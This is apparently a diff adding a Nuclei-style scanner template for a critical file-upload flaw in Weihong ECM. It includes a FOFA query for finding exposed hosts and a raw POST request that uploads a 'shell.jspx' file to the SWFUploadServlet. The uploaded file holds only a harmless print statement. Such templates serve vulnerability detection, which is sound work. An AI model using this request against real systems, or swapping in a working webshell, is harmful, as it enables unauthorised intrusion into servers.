@@ -1,0 +1,41 @@
+id: weihong-ecm-swfuploadservlet-file-upload
+
+info:
+  name: Weihong Ecm File Upload Vulnerability
+  author: zp857
+  severity: critical
+  tags: weihong-ecm,fileupload
+  metadata:
+    fofa-query: 'body="wh/servlet" || body="ECM协同管理平台"'
+
+requests:
+  - raw:
+      - |
+        POST /wh/servlet/SWFUploadServlet?flag=wf_upload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysIcyhDX3z70xOHUG
+
+        ------WebKitFormBoundarysIcyhDX3z70xOHUG
+        Content-Disposition: form-data; name="containerId"
+
+        100
+        ------WebKitFormBoundarysIcyhDX3z70xOHUG
+        Content-Disposition: form-data; name="create_user"
+
+        admin
+        ------WebKitFormBoundarysIcyhDX3z70xOHUG
+        Content-Disposition: form-data; name="file"; filename="shell.jspx"
+        Content-Type: application/octet-stream
+
+        <% out.println(1); %>
+        ------WebKitFormBoundarysIcyhDX3z70xOHUG--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "ERROR:ORA"
+
+      - type: status
+        status:
+          - 200
